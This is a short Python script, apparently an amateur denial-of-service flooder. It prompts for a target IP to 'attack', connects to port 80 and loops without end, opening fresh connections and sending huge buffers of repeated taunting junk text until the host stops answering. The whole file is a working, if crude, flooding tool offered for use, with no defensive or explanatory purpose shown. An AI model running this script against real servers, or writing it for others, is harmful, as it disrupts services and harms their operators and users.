import socket

ip = input("EnterIP to ATTACK:")
port = 80
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((ip, port))
banner = s.recv(1024)
import time
print("Connected to host!!")
print("Attack started!")
num = 0
while True:
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((ip, port))
        buffer = bytes("U GOT DDOS ATTACK ON YOUR ´´|||||||||%%$$$$$$$////////\HAHAAHHAHAHAHHAAHAHHAHAHHA , . : - -----_____¤¤¤¤¤4&&&&)()(%¤#&/¤#" * 900000, "utf-8")
        buffer = bytes("U ^^^^^^^^^^^^feOT åååååååOS ATTAC¨ffwjefiuf//&¤#¤#%&(/)/()= ´´|||||||||%%$$$$$$$////////\HAHAAHHAHAHAHHAAHAHHAHAHHA , . : - -----_____¤¤¤¤¤4&&&&)()(%¤#&/¤#" * 900000, "utf-8")

        s.send(buffer)
        num = num + 1
        print(num)
        s.close()
    except:
        print("Connection to host lost host maybe down.  or you type    control + c")
        time.sleep(6)
        s.close()
        exit()
